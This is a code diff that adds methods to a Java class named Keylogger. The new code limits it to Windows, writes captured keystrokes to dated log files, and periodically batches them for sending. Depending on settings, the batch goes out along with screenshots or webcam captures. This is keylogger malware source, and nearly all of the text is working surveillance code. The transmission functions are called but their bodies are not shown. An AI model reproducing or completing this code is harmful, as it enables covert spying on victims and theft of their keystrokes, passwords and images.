@@ -106,5 +106,44 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
-    
+    private static void detectOS() {
+        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
+            System.out.println("[!] OS is not supported!");
+            System.exit(0);
+        }
+    }
+
+    public void SaveLogs(String c) {
+        logs += c;
+        count_state += 1;
+        try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
+            bw.write(c);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        // System.out.println("Logs: " + logs);
+        // System.out.println("Count: " + count_state);
+
+        if (count_state >= count) {
+            count_state = 0;
+            logs_send = logs;
+            logs = "";
+
+            if (screenshot == true && cam == true) {
+                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
+                sendAll();
+            } else if (screenshot == true && cam == false) {
+                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
+                sendScreenshot();
+            } else if (screenshot == false && cam == true) {
+
+                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
+                sendCam();
+            } else if (screenshot == false && cam == false) {
+                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
+                send();
+            }
+        }
+    }
 }
